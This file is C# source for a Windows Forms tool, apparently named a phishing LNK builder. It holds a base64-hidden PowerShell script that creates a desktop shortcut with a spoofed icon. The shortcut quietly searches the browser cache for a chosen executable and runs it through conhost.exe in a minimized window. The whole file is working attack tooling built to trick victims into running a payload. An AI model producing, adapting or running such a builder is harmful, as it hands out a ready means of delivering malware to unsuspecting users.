using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace PhishingLnk
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        string builder = Encoding.Default.GetString(Convert.FromBase64String("JHNoZWxsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGw7JGRlc2t0b3AgPSBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnRGVza3RvcCcpOyRzaG9ydGN1dCA9ICRzaGVsbC5DcmVhdGVTaG9ydGN1dCgiJGRlc2t0b3BcJWZpbGVuYW1lJS5sbmsiKTskc2hvcnRjdXQuVGFyZ2V0UGF0aCA9ICJDOlx3aW5kb3dzXHN5c3RlbTMyXGNvbmhvc3QuZXhlIjskc2hvcnRjdXQuV2luZG93U3R5bGUgPSA3OyRzaG9ydGN1dC5Bcmd1bWVudHMgPSAnIC9jICJjZCAlVVNFUlBST0ZJTEUlXEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0XFdpbmRvd3NcSU5ldENhY2hlICYgZGlyIC9zIC9CICVmaWxlbmFtZSUqLmV4ZSB8IGNvbmhvc3QuZXhlIC9rIiAnOyRzaG9ydGN1dC5JY29uTG9jYXRpb24gPSAiJWxuayU/LmljbyI7JHNob3J0Y3V0LlNhdmUoKTs="));
        
        private void button1_Click(object sender, EventArgs e)
        {
            string lnk = textBox1.Text;
            string filename = textBox2.Text;
            builder = builder.Replace("%lnk%", lnk).Replace("%filename%", filename);
            string tmp = Path.Combine(Path.GetTempPath(), "Tempbuilder.ps1");
            File.WriteAllText(tmp, builder);
            Process.Start("Powershell.exe", tmp);
            MessageBox.Show("Done.\nFile saved on your desktop.");
        }
    }
}
